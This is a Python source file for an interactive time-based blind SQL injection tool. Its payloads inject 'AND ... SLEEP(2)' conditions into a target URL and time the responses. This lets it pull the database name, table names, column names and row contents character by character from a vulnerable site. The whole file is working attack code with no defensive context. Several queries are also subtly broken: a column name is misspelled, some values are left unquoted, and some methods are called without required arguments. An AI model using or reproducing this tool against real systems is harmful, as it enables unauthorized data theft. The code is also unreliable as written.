#!/usr/bin/python3
# -*- coding: UTF-8 -*-
# Author: QianTian
from utils import timer
import requests


class TimeInjector:
    def __init__(self, injectpoint, cookies, str, suffix):
        self.url = injectpoint + str + "' " + '{}' + suffix
        self.cookies = cookies
        self.suffix = suffix
        self.flag = False
        self.num = 21
        self.get_need()
        self.dbnamelen = None
        self.dbname = None
        self.tablenums = None
        self.columnnums = None
        self.tablenames = []
        self.tablelens = []
        self.columnlens = []
        self.columnnames = []
        self.elemnums = None

    def get_need(self):
        while not self.flag:
            print("***************************\n"
                  "* please choose your need *\n"
                  "* 1.get dbname            *\n"
                  "* 2.get all table         *\n"
                  "* 3.get table columns     *\n"
                  "* 4.get table all elems   *\n"
                  "* 0.exit                  *\n"
                  "***************************\n")
            try:
                option = int(input("choose: "))
            except Exception as ex:
                print("No options")
                continue
            if option == 0:
                return
            if option == 1:
                self.get_dbnamelen()
                self.get_dbname()
            elif option == 2:
                self.get_table_nums()
                self.get_table_lens()
                self.get_tablenames()
            elif option == 3:
                tablename = input("Please input tablename")
                self.get_column_nums(tablename)
                self.get_column_lens(tablename)
                self.get_columnnames(tablename)
            elif option == 4:
                tablename = input("Please input tablename")
                self.get_table_elem_lens()
                self.get_table_elems()
            else:
                print("No options")
            input("< Enter to continue >")
            continue

    def get_dbnamelen(self):
        num = self.num + 1
        for i in range(1, num):
            elem = f"AND LENGTH(DATABASE())={i} AND SLEEP(2) -- " + self.suffix
            url = self.url.format(elem)
            time = timer(requests.get, url, self.cookies)
            if time > 2:
                self.dbnamelen = i
                return
        print("Get Dbnamelen Failed!")

    def get_dbname(self):
        if self.dbnamelen:
            num = self.dbnamelen + 1
            dbname = ''
            for i in range(1, num):
                for j in range(3, 128):
                    elem = f"AND ASCII(SUBSTR(DATABASE(),{i},1))={j} AND SLEEP(2) -- " + self.suffix
                    url = self.url.format(elem)
                    time = timer(requests.get, url, self.cookies)
                    if time > 2:
                        dbname = dbname + chr(j)
                        break
            self.dbname = dbname
            print("DBname: %s" % self.dbname)
        else:
            return

    def get_table_nums(self):
        if not self.dbname:
            self.dbname = input("Please input dbname: ")
        for i in range(1, 100):
            elem = f"AND (SELECT COUNT(table_name) FROM information_schema.tables WHERE \
            table_shcema='{self.dbname}')={i} AND SLEEP(2) -- " + self.suffix
            url = self.url.format(elem)
            time = timer(requests.get, url, self.cookies)
            if time > 2:
                self.tablenums = i
                break

    def get_table_lens(self):
        if self.tablenums:
            num = self.tablenums + 1
            for i in range(0, num):
                for j in range(1, 21):
                    elem = f"AND LENGTH((SELECT table_name FROM information_schema.tables WHERE \
                    table_schema={self.dbname} LIMIT {i},1))={j} AND SLEEP(2) -- "
                    url = self.url.format(elem)
                    time = timer(requests.get, url, self.cookies)
                    if time > 2:
                        self.tablelens.append(j)
                        break
        else:
            return

    def get_tablenames(self):
        if self.tablelens:
            for i in range(0,self.tablenums):
                j = self.tablelens[i] + 1
                tablename = ''
                for k in range(1, j):
                    for m in range(33, 128):
                        elem = f"AND ASCII(SUBSTR((SELECT table_name FROM information_schema.tables \
                        WHERE table_schema={self.dbname} LIMIT {i},1),{k},1))={m} AND SLEEP(2) -- "
                        url = self.url.format(elem)
                        time = timer(requests.get, url, self.cookies)
                        if time > 2:
                            tablename = tablename + chr(m)
                            break
                self.tablenames.append(tablename)
            print(self.tablenames)
        else:
            return

    def get_column_nums(self,tablename):
        if not self.dbname:
            self.dbname = input("Please input dbname: ")
        for i in range(1, 100):
            elem = f"AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE \
            table_shcema='{self.dbname}' AND table_name='{tablename}')={i} AND SLEEP(2) -- " + self.suffix
            url = self.url.format(elem)
            time = timer(requests.get, url, self.cookies)
            if time > 2:
                self.columnnums = i
                break

    def get_column_lens(self, tablename):
        if self.columnnums:
            num = self.columnnums + 1
            for i in range(0, num):
                for j in range(1, 21):
                    elem = f"AND LENGTH((SELECT column_name FROM information_schema.columns WHERE \
                        table_shcema='{self.dbname}' AND table_name='{tablename}' LIMIT {i},1))={j} AND SLEEP(2) -- "
                    url = self.url.format(elem)
                    time = timer(requests.get, url, self.cookies)
                    if time > 2:
                        self.columnlens.append(j)
                        break
        else:
            return

    def get_columnnames(self, tablename):
        if self.columnlens:
            for i in range(0,self.columnnums):
                j = self.columnlens[i] + 1
                column = ''
                for k in range(1, j):
                    for m in range(33, 128):
                        elem = f"AND ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE \
                        table_shcema='{self.dbname}' AND table_name='{tablename}' LIMIT {i},1),{k},1))={m} \
                        AND SLEEP(2) -- "
                        url = self.url.format(elem)
                        time = timer(requests.get, url, self.cookies)
                        if time > 2:
                            column = column + chr(m)
                            break
                self.columnnames.append(column)
            print(self.columnnames)
        else:
            return

    def get_table_elem_nums(self, tablename, columns):
        if not self.dbname:
            self.dbname = input("Please input dbname: ")
        for i in range(1, 100):
            elem = f"AND (SELECT COUNT({columns}) FROM {self.dbname}.{tablename})={i} AND SLEEP(2) -- "
            url = self.url.format(elem)
            time = timer(requests.get, url, self.cookies)
            if time > 2:
                self.elemnums = i
                break

    def get_table_elem_lens(self, tablename, columns):
        if self.elemnums:
            elemlens = []
            num = self.elemnums + 1
            for i in range(0, num):
                for j in range(1, 21):
                    elem = f"AND LENGTH((SELECT {columns} FROM {self.dbname}.{tablename} LIMIT {i},1)) \
                     ={j} AND SLEEP(2) -- "
                    url = self.url.format(elem)
                    time = timer(requests.get, url, self.cookies)
                    if time > 2:
                        elemlens.append(j)
                        break
            return elemlens
        else:
            return

    def get_table_elems(self, tablename, columns, elemlens):
        elems = []
        for i in range(0,self.elemnums):
            j = elemlens[i] + 1
            elem = ''
            for k in range(1, j):
                for m in range(33, 128):
                    elem = f"AND ASCII(SUBSTR((SELECT {columns} FROM {self.dbname}.{tablename} LIMIT \
                    {j},1),{k},1))={m} AND SLEEP(2) -- "
                    url = self.url.format(elem)
                    time = timer(requests.get, url, self.cookies)
                    if time > 2:
                        elem = elem + chr(m)
            elems.append(elem)
        print(elems)













